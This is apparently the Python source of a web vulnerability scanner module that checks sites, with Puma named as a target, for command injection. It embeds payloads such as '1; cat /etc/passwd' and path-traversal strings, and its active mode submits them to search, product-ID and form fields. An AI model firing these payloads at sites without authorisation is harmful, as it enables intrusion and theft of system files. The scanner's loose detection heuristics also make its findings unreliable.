import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from ..analyzers.base import BaseAnalyzer
from requests import Response
from typing import List, Dict
import time

class RCEAnalyzer(BaseAnalyzer):
    def __init__(self):
        super().__init__()
        self.name = "RCE Analyzer"
        # Payloads specifically targeting Puma vulnerabilities
        self.payloads = [
            # Simple command injection
            "1; ls",
            "1 && ls",
            "1 | ls",
            # Search command injection
            "test && ls",
            "test; ls",
            "test | ls",
            # Product search injection
            "product && ls",
            "product; ls",
            # Common Puma paths
            "../etc/passwd",
            "../../etc/passwd",
            # Simple commands that should work
            "& echo vulnerable &",
            "; echo vulnerable ;",
            "| echo vulnerable |",
            # Specific to Puma's known vulnerabilities
            "1 && cat /etc/passwd",
            "1; cat /etc/passwd",
            "1 | cat /etc/passwd",
            # URL-encoded variants
            "1%3B%20ls",
            "1%26%26%20ls",
            "1%7C%20ls"
        ]
        self.session = requests.Session()
        self.session.verify = False

    def _safe_request(self, method, url, **kwargs):
        try:
            kwargs['timeout'] = 10
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Accept': '*/*'
            }
            kwargs['headers'] = headers
            response = self.session.request(method, url, **kwargs)
            time.sleep(0.1)
            return response
        except Exception as e:
            print(f"Request error ({method} {url}): {str(e)}")
            return None

    def analyze(self, url, mode='passive'):
        print(f"[RCE] Starting analysis of {url}")
        self.clear_results()
        
        # Test main endpoints
        endpoints = [
            '',  # Root path
            '/search',
            '/products',
            '/product/1',  # Common product ID
            '/admin'  # Admin section if exists
        ]
        
        vulnerabilities = []
        for endpoint in endpoints:
            target_url = urljoin(url, endpoint)
            response = self._safe_request('GET', target_url)
            if response:
                print(f"[RCE] Testing endpoint: {target_url}")
                soup = BeautifulSoup(response.text, 'html.parser')
                
                if mode == 'passive':
                    vulns = self.passive_scan(response, soup)
                else:
                    vulns = self.active_scan(target_url, response, soup)
                vulnerabilities.extend(vulns)
        
        return vulnerabilities

    def passive_scan(self, response: Response, soup: BeautifulSoup) -> List[Dict]:
        vulnerabilities = []
        print("[RCE] Starting passive scan")
        
        try:
            # Check for potentially vulnerable input fields
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all(['input', 'textarea'])
                for input_field in inputs:
                    field_type = input_field.get('type', '')
                    field_name = input_field.get('name', '').lower()
                    
                    # Check search and product-related fields
                    if field_name in ['q', 'query', 'search', 'product', 'id']:
                        print(f"[RCE] Found potentially vulnerable field: {field_name}")
                        vulnerabilities.append(
                            self.create_vulnerability_report(
                                name='Potential RCE Point',
                                description=f'Input field "{field_name}" might be vulnerable to command injection',
                                risk_level='high',
                                evidence=f'Field found in form: {field_name}',
                                fix_recommendation='Implement proper input validation and sanitization for user inputs.'
                            )
                        )
        except Exception as e:
            print(f"Error in passive scan: {str(e)}")
        
        return vulnerabilities

    def active_scan(self, url: str, response: Response, soup: BeautifulSoup) -> List[Dict]:
        vulnerabilities = []
        print(f"[RCE] Starting active scan for {url}")
        
        try:
            # Test search functionality
            if '/search' in url or url.endswith('/'):
                print("[RCE] Testing search functionality")
                for payload in self.payloads:
                    response = self._safe_request('GET', url, params={'q': payload})
                    if self._check_response_for_rce(response, payload):
                        vulnerabilities.append(
                            self.create_vulnerability_report(
                                name='RCE in Search Function',
                                description='Search functionality is vulnerable to command injection',
                                risk_level='high',
                                evidence=f'Successful injection with payload: {payload}',
                                fix_recommendation='Implement proper input validation for search parameters'
                            )
                        )
                        break

            # Test product-related functionality
            if '/product' in url:
                print("[RCE] Testing product functionality")
                for payload in self.payloads:
                    test_url = url.replace('/product/1', f'/product/{payload}')
                    response = self._safe_request('GET', test_url)
                    if self._check_response_for_rce(response, payload):
                        vulnerabilities.append(
                            self.create_vulnerability_report(
                                name='RCE in Product ID',
                                description='Product ID parameter is vulnerable to command injection',
                                risk_level='high',
                                evidence=f'Successful injection with payload: {payload}',
                                fix_recommendation='Implement proper validation for product IDs'
                            )
                        )
                        break

            # Test forms
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                if not action:
                    action = url
                else:
                    action = urljoin(url, action)
                
                method = form.get('method', 'get').lower()
                inputs = form.find_all(['input', 'textarea'])
                
                for payload in self.payloads:
                    data = {}
                    for input_field in inputs:
                        if input_field.get('type') not in ['submit', 'button', 'image']:
                            data[input_field.get('name', 'Unknown')] = payload
                    
                    if method == 'post':
                        response = self._safe_request('POST', action, data=data)
                    else:
                        response = self._safe_request('GET', action, params=data)
                    
                    if self._check_response_for_rce(response, payload):
                        vulnerabilities.append(
                            self.create_vulnerability_report(
                                name='RCE in Form Input',
                                description=f'Form input is vulnerable to command injection',
                                risk_level='high',
                                evidence=f'Form action: {action}, Payload: {payload}',
                                fix_recommendation='Implement proper input validation for all form fields'
                            )
                        )
                        break
        
        except Exception as e:
            print(f"Error in active scan: {str(e)}")
        
        return vulnerabilities

    def _check_response_for_rce(self, response, payload) -> bool:
        if not response or not response.text:
            return False
            
        response_text = response.text.lower()
        
        # Check for command execution evidence
        indicators = [
            # File content indicators
            "root:",
            "bin:",
            "daemon:",
            "nobody:",
            # Directory listing indicators
            "total ",
            "drwx",
            "-rw-",
            # Command output markers
            "vulnerable",
            # Error messages that might indicate command execution
            "command not found",
            "syntax error",
            "permission denied",
            # System file content
            "/etc/passwd",
            "/etc/shadow",
            # Directory contents
            "readme",
            "index",
            ".txt",
            ".rb",
            ".py"
        ]
        
        # Check for direct command output
        for indicator in indicators:
            if indicator.lower() in response_text:
                print(f"[RCE] Found indicator: {indicator} for payload: {payload}")
                return True
        
        # Check response length for potential data leakage
        if len(response_text) > 0 and any(cmd in payload for cmd in ['ls', 'dir', 'cat']):
            if len(response_text) > len(payload) * 2:
                print(f"[RCE] Possible data leakage detected for payload: {payload}")
                return True
        
        return False

    def _get_forms(self, url):
        try:
            response = self._safe_request('GET', url)
            if response:
                soup = BeautifulSoup(response.text, 'html.parser')
                return soup.find_all('form')
        except Exception as e:
            print(f"Error getting forms: {str(e)}")
        return [] 